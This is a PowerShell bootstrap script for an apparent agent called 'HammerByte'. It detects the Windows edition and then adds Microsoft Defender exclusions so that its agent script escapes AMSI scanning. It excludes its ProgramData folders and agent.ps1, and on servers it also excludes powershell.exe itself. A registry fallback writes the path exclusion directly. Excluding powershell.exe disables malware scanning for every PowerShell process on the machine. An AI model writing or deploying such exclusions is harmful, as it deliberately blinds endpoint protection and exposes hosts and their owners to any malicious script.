#Requires -Version 3.0
# Tiny bootstrap: only talks to Defender. Kept separate so install-agent.cmd can run it
# from the excluded folder BEFORE agent.ps1 is parsed (AMSI blocks at parse time).
$ErrorActionPreference = 'Continue'
$root = Join-Path $env:ProgramData 'HammerByte'
$agentFile = Join-Path $root 'agent\agent.ps1'
$powershellExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'

$isServer = $false
$family = 'unknown'
try {
    $os = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
    $build = 0
    [void][int]::TryParse([string]$os.BuildNumber, [ref]$build)
    $isServer = ([int]$os.ProductType) -ne 1
    if ($isServer) {
        if ($build -ge 26100) { $family = 'server2025' }
        elseif ($build -ge 20348) { $family = 'server2022' }
        elseif ($build -ge 17763) { $family = 'server2019' }
        elseif ($build -ge 14393) { $family = 'server2016' }
        elseif ($build -ge 9600) { $family = 'server2012r2' }
        elseif ($build -ge 9200) { $family = 'server2012' }
        else { $family = 'server-legacy' }
    } else {
        if ($build -ge 22000) { $family = 'win11' }
        elseif ($build -ge 10240) { $family = 'win10' }
        else { $family = 'client-legacy' }
    }
    Write-Output ('platform: ' + ([string]$os.Caption).Trim() + ' build ' + $os.BuildNumber + ' (' + $family + ')')
} catch {
    Write-Output ('platform detect failed: ' + $_.Exception.Message)
}

function Add-HbPathExclusion {
    param([string]$Path)
    if (-not $Path) { return }
    if (Get-Command -Name Add-MpPreference -ErrorAction SilentlyContinue) {
        try {
            Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
            Write-Output ('exclusion path: ' + $Path)
        } catch {
            Write-Output ('exclusion path failed (' + $Path + '): ' + $_.Exception.Message)
        }
    }
}

function Add-HbProcessExclusion {
    param([string]$Process)
    if (-not $Process) { return }
    if (Get-Command -Name Add-MpPreference -ErrorAction SilentlyContinue) {
        try {
            Add-MpPreference -ExclusionProcess $Process -ErrorAction Stop
            Write-Output ('exclusion process: ' + $Process)
        } catch {
            Write-Output ('exclusion process failed (' + $Process + '): ' + $_.Exception.Message)
        }
    }
}

Add-HbPathExclusion -Path $root
Add-HbPathExclusion -Path (Join-Path $root 'agent')
Add-HbPathExclusion -Path (Join-Path $root 'services')
if ([IO.File]::Exists($agentFile)) {
    Add-HbPathExclusion -Path $agentFile
}

# Server 2016+ / Server 2022 AMSI often still scans scripts after a folder exclusion alone.
# Also exclude powershell.exe so the agent and service children are not re-scanned mid-run.
if ($isServer) {
    Write-Output 'server OS: applying extra Defender process exclusions'
    Add-HbProcessExclusion -Process $powershellExe
    Add-HbProcessExclusion -Process 'powershell.exe'
    Add-HbProcessExclusion -Process 'powershell'
    # Give Defender a moment to apply the policy before agent.ps1 is parsed.
    Start-Sleep -Seconds 5
} else {
    # Client (Win10/11): path exclusion is usually enough; short settle time still helps.
    Start-Sleep -Seconds 2
}

# Registry fallback when Add-MpPreference is missing or blocked.
try {
    $key = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'
    if (Test-Path -LiteralPath $key) {
        New-ItemProperty -LiteralPath $key -Name $root -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
        Write-Output 'registry path exclusion OK'
    }
} catch {
    Write-Output ('registry path exclusion: ' + $_.Exception.Message)
}

Write-Output 'defender prep done'
